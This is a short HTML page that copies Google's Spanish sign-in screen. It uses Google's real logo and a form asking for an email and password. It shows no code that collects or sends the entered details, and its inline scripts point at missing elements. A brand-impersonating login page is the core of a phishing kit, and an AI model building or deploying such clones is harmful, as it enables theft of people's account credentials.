<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Google</title>
    <link rel="stylesheet" href="styles.css">
<style type="text/css" id="dcoder_stylesheet">body {
    font-family: Arial, sans-serif;
    background-color: #f1f1f1;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.login-container {
    width: 400px;
    background-color: #ffffff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

.logo {
    display: block;
    margin: 0 auto 20px;
    width: 100px;
}

.title {
    text-align: center;
    margin-bottom: 20px;
}

.input-group {
    margin-bottom: 15px;
}

.input-group label {
    display: block;
    font-size: 14px;
    color: #666666;
    margin-bottom: 5px;
}

.input-group input {
    width: 95%;
    padding: 10px;
    font-size: 16px;
    border: 1px solid #cccccc;
    border-radius: 4px;
}

.buttons {
    text-align: right;
}

.next-button {
    background-color: #4CAF50;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
}

.next-button:hover {
    background-color: #45a049;
}

.login-form {
    display: block;
}

.hidden {
    display: none;
}

.links {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    margin-left: 0px;
}

.forgot-password {
    margin-bottom: 10px;
}</style></head>
<body>
    <div class="login-container">
        <div class="login-box">
            <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google logo" class="logo">
            <h1 class="title">Inicia sesión</h1>
            <form id="login-form">
                <div class="input-group">
                    <input type="email" id="email" name="email" required>
                    <label for="email">Correo electrónico o teléfono</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" required>
                    <label for="password">Contraseña</label>
                </div>
                <div class="buttons">
                    <button type="submit" class="next-button">Siguiente</button>
                </div>
            </form>
            <div class="links">
                <div class="forgot-password">
                    <a href="#" class="forgot-email">¿Has olvidado el correo electrónico?</a>
                </div>
                <div class="create-account">
                    <a href="#">Crear cuenta</a>
                </div>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
<script type="text/javascript" id="dcoder_script">
    function showPasswordForm() {
        document.getElementById('form-email').classList.add('hidden');
        document.getElementById('form-password').classList.remove('hidden');
    }
</script>

<script type="text/javascript" id="dcoder_script">function showPasswordForm() {
    document.getElementById('email').classList.add('hidden');
    document.getElementById('password').classList.remove('hidden');
}</script></body></html>
